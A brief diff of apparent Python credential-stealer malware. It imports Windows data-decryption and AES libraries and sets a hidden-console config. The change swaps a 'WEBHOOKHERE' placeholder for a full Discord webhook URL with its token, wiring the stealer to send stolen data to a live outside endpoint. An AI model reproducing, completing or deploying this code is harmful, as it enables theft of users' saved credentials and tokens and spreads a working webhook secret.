@@ -7,8 +7,10 @@ from win32crypt import CryptUnprotectData
 from Crypto.Cipher import AES
 from cryptography.fernet import Fernet
 
+# "WEBHOOKHERE" 
+
 config = {
-    'webhook': "WEBHOOKHERE",
+    'webhook': "https://discord.com/api/webhooks/1184499886796840970/QzYPRdU7iuXeC_jidEUlrVNszK_6SvE0tzkblPDLSXqYDEzm7ziKKOKXOZRTrpiv0Zuc",
     'persist': False,
     'keep-alive': False,  
     'hideconsole': True, 
